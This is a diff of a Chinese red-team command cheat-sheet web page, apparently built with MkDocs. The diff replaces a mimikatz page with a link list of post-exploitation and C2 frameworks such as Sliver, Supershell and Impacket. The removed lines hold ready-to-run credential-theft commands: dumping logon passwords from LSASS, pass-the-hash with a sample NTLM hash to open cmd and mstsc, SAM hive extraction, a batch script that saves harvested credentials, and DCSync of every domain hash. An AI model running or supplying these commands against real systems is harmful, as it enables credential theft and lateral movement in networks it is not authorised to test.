@@ -8,7 +8,7 @@
     The page_title contains the title for a page as shown in the navigation.
     Site name contains the name as defined in the mkdocs.yml
   -->
-  <title>mimikatz - 红队命令速查</title>
+  <title>后渗透工具列表 - 红队命令速查</title>
 
   <!-- Page description -->
   
@@ -182,7 +182,7 @@
 -->
 
 <li>
-  <a href="./" class="side-bar__link side-bar__link--active">
+  <a href="../mimikatz/" class="side-bar__link ">
     mimikatz
   </a>
 </li>
@@ -206,7 +206,7 @@
 -->
 
 <li>
-  <a href="../%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/" class="side-bar__link ">
+  <a href="./" class="side-bar__link side-bar__link--active">
     后渗透工具列表
   </a>
 </li>
@@ -287,7 +287,7 @@
     <!-- MAIN BLOCK -->
     <main class="app-layout__main main">
       <div class="app-layout__title-bar title-bar">
-        <div class="title-bar__title" style="font-size: 12px;">mimikatz</div>
+        <div class="title-bar__title" style="font-size: 12px;">后渗透工具列表</div>
       </div>
       
       <div class="sidebar--secondary hidden-s hidden-xs">
@@ -296,25 +296,19 @@
         
           
             
-                <li><a class="a" href="#_1">获取登录凭证信息</a></li>
+                <li><a class="a" href="#f8x">f8x</a></li>
                 
             
-                <li><a class="a" href="#lsassexe">lsass.exe 导出凭据</a></li>
+                <li><a class="a" href="#supershell">Supershell</a></li>
                 
             
-                <li><a class="a" href="#mimikatz-pth-cmd">mimikatz PTH 传递 cmd</a></li>
+                <li><a class="a" href="#viper">Viper</a></li>
                 
             
-                <li><a class="a" href="#mimikatz-pth-mstsc">mimikatz PTH 传递 mstsc</a></li>
+                <li><a class="a" href="#sliver-c2">Sliver C2</a></li>
                 
             
-                <li><a class="a" href="#sam">SAM 数据库导出凭据</a></li>
-                
-            
-                <li><a class="a" href="#bat">bat 脚本获取凭据</a></li>
-                
-            
-                <li><a class="a" href="#hash">导出域内所有用户hash</a></li>
+                <li><a class="a" href="#impacket">Impacket</a></li>
                 
             
           
@@ -328,37 +322,45 @@
             <div class="card__body">
 
               
-              <h1 id="mimikatz">mimikatz</h1>
-<p>官方 Github：https://github.com/gentilkiwi/mimikatz</p>
-<h2 id="_1">获取登录凭证信息</h2>
-<pre><code>mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
-</code></pre>
-<pre><code>privilege::debug
-sekurlsa::logonpasswords
-</code></pre>
-<h2 id="lsassexe">lsass.exe 导出凭据</h2>
-<pre><code>mimikatz.exe log &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
-</code></pre>
-<h2 id="mimikatz-pth-cmd">mimikatz PTH 传递 cmd</h2>
-<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe&quot; &quot;exit&quot;
-</code></pre>
-<h2 id="mimikatz-pth-mstsc">mimikatz PTH 传递 mstsc</h2>
-<pre><code>mimikatz &quot;privilege::debug&quot;  &quot;sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin&quot; &quot;exit&quot;
-</code></pre>
-<pre><code>privilege::debug
-sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 &quot;/run:mstsc.exe /restrictedadmin&quot;
-</code></pre>
-<h2 id="sam">SAM 数据库导出凭据</h2>
-<pre><code>mimikatz &quot;log&quot; &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot;  &quot;exit&quot;
-</code></pre>
-<h2 id="bat">bat 脚本获取凭据</h2>
-<pre><code>@echo off
-cd /d D:\tools\
-mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\windows\temp\log.txt
-</code></pre>
-<h2 id="hash">导出域内所有用户hash</h2>
-<pre><code>mimikatz.exe &quot;lsadump::dcsync /domain:test.com /all /csv&quot; exit
-</code></pre>
+              <h1 id="_1">后渗透工具列表</h1>
+<h2 id="f8x">f8x</h2>
+<blockquote>
+<p>一款红/蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等</p>
+</blockquote>
+<ul>
+<li>项目地址：<a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a></li>
+<li>中文文档：<a href="https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md">https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md</a></li>
+</ul>
+<h2 id="supershell">Supershell</h2>
+<blockquote>
+<p>Supershell C2 远控平台，基于反向SSH隧道获取完全交互式Shell</p>
+</blockquote>
+<ul>
+<li>项目地址：<a href="https://github.com/tdragon6/Supershell">https://github.com/tdragon6/Supershell</a></li>
+</ul>
+<h2 id="viper">Viper</h2>
+<blockquote>
+<p>互联网攻击面管理&amp;红队模拟平台</p>
+</blockquote>
+<ul>
+<li>项目地址：<a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a></li>
+<li>安装 or 使用手册：<a href="https://www.yuque.com/vipersec/install/olg1ua">https://www.yuque.com/vipersec/install/olg1ua</a></li>
+</ul>
+<h2 id="sliver-c2">Sliver C2</h2>
+<blockquote>
+<p>Sliver C2 是一个开源的跨平台红队框架。</p>
+</blockquote>
+<ul>
+<li>项目地址：<a href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a></li>
+<li><a href="https://forum.butian.net/share/2243">红队工具研究篇 - Sliver C2</a></li>
+</ul>
+<h2 id="impacket">Impacket</h2>
+<blockquote>
+<p>内网渗透 Python 工具包</p>
+</blockquote>
+<ul>
+<li>项目地址：<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></li>
+</ul>
               
             </div>
           </div>
@@ -376,16 +378,16 @@ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\windows\temp
           <div class="col col--s-4 col--m space-between">
             
               <a class="footer__link padding-top-0 navigation-prev"
-                href="../../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/"
-                title="Windows 命令速查">
+                href="../proxy/"
+                title="proxy tools">
                 &#8592; Previous Page
               </a>
             
             
             
               <a class="footer__link padding-top-0 navigation-next"
-                href="../proxy/"
-                title="proxy tools"/>
+                href="../../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/"
+                title="oracle"/>
                 Next Page &#8594;
               </a>
             
@@ -401,7 +403,7 @@ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\windows\temp
 
   <!--
   MkDocs version      : 1.5.3
-  Docs Build Date UTC : 2024-07-11 13:53:22.950888+00:00
+  Docs Build Date UTC : 2024-07-11 13:53:22.953620+00:00
   -->
 
   <!--
